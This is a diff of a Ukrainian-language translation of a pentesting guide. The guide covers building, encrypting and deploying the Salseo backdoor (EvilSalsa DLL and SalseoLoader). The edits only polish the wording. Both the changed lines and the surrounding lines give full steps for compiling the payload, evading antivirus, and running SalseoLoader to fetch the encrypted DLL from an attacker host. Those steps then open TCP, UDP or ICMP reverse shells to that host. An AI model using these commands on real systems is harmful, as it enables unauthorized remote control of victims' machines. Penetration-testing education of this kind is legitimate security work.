@@ -6,15 +6,15 @@
 
 Завантажте вихідний код з github і скомпілюйте **EvilSalsa** та **SalseoLoader**. Вам потрібно буде встановити **Visual Studio** для компіляції коду.
 
-Скомпіліруйте ці проекти для архітектури Windows, на якій ви плануєте їх використовувати (якщо Windows підтримує x64, компілюйте їх для цієї архітектури).
+Скомпіліруйте ці проекти для архітектури Windows, на якій ви будете їх використовувати (якщо Windows підтримує x64, скомпіліруйте їх для цієї архітектури).
 
 Ви можете **вибрати архітектуру** в Visual Studio у **лівій вкладці "Build"** у **"Platform Target".**
 
-(\*\*Якщо ви не можете знайти ці опції, натисніть на **"Project Tab"** і потім на **"\<Project Name> Properties"**)
+(**Якщо ви не можете знайти ці опції, натисніть на **"Project Tab"** і потім на **"\<Project Name> Properties"**)
 
 ![](<../images/image (132).png>)
 
-Потім збудуйте обидва проекти (Build -> Build Solution) (У логах з'явиться шлях до виконуваного файлу):
+Потім збудуйте обидва проекти (Build -> Build Solution) (внутрішні журнали покажуть шлях до виконуваного файлу):
 
 ![](<../images/image (1) (2) (1) (1) (1).png>)
 
@@ -32,15 +32,15 @@ python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
 ```
-Добре, тепер у вас є все необхідне для виконання всіх Salseo дій: **закодований EvilDalsa.dll** та **бінарний файл SalseoLoader.**
+Добре, тепер у вас є все необхідне для виконання всіх дій Salseo: **закодований EvilDalsa.dll** та **бінарний файл SalseoLoader.**
 
-**Завантажте бінарний файл SalseoLoader.exe на машину. Вони не повинні бути виявлені жодним AV...**
+**Завантажте бінарний файл SalseoLoader.exe на машину. Вони не повинні бути виявлені жодним антивірусом...**
 
 ## **Виконання бекдору**
 
 ### **Отримання TCP зворотного шеллу (завантаження закодованого dll через HTTP)**
 
-Не забудьте запустити nc як прослуховувач зворотного шеллу та HTTP сервер для обслуговування закодованого evilsalsa.
+Не забудьте запустити nc як прослуховувач зворотного шеллу та HTTP сервер для надання закодованого evilsalsa.
 ```
 SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
 ```
@@ -50,9 +50,9 @@ SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Att
 ```
 SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
 ```
-### **Отримання ICMP зворотного шелу (закодована dll вже всередині жертви)**
+### **Отримання ICMP зворотного шеллу (закодована dll вже всередині жертви)**
 
-**Цього разу вам потрібен спеціальний інструмент на клієнті для отримання зворотного шелу. Завантажте:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
+**Цього разу вам потрібен спеціальний інструмент на клієнті для отримання зворотного шеллу. Завантажте:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
 
 #### **Вимкнути ICMP відповіді:**
 ```
@@ -83,7 +83,7 @@ SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 
 ![](<../images/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-#### **Шукайте пакет DllExport (використовуючи вкладку Перегляд), і натисніть Встановити (і прийміть спливаюче вікно)**
+#### **Шукайте пакет DllExport (використовуючи вкладку Перегляд) і натисніть Встановити (і прийміть спливаюче вікно)**
 
 ![](<../images/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
@@ -101,7 +101,7 @@ SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 
 Потім перейдіть до вашої **папки SalseoLoader** і **виконайте DllExport_Configure.bat**
 
-Виберіть **x64** (якщо ви збираєтеся використовувати його всередині x64 системи, це був мій випадок), виберіть **System.Runtime.InteropServices** (всередині **Namespace for DllExport**) і натисніть **Застосувати**
+Виберіть **x64** (якщо ви збираєтеся використовувати його всередині x64 коробки, це був мій випадок), виберіть **System.Runtime.InteropServices** (всередині **Простір імен для DllExport**) і натисніть **Застосувати**
 
 ![](<../images/image (7) (1) (1) (1) (1).png>)
 
@@ -121,11 +121,11 @@ SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 
 ![](<../images/image (9) (1) (1).png>)
 
-Щоб **зібрати** рішення: Збірка --> Зібрати рішення (в консолі виходу з'явиться шлях до нової DLL)
+Щоб **зібрати** рішення: Збірка --> Зібрати рішення (в консолі виходу з'явиться шлях до нового DLL)
 
-### Тестуйте згенеровану DLL
+### Тестуйте згенерований Dll
 
-Скопіюйте та вставте DLL туди, де ви хочете її протестувати.
+Скопіюйте та вставте Dll туди, де ви хочете його протестувати.
 
 Виконайте:
 ```
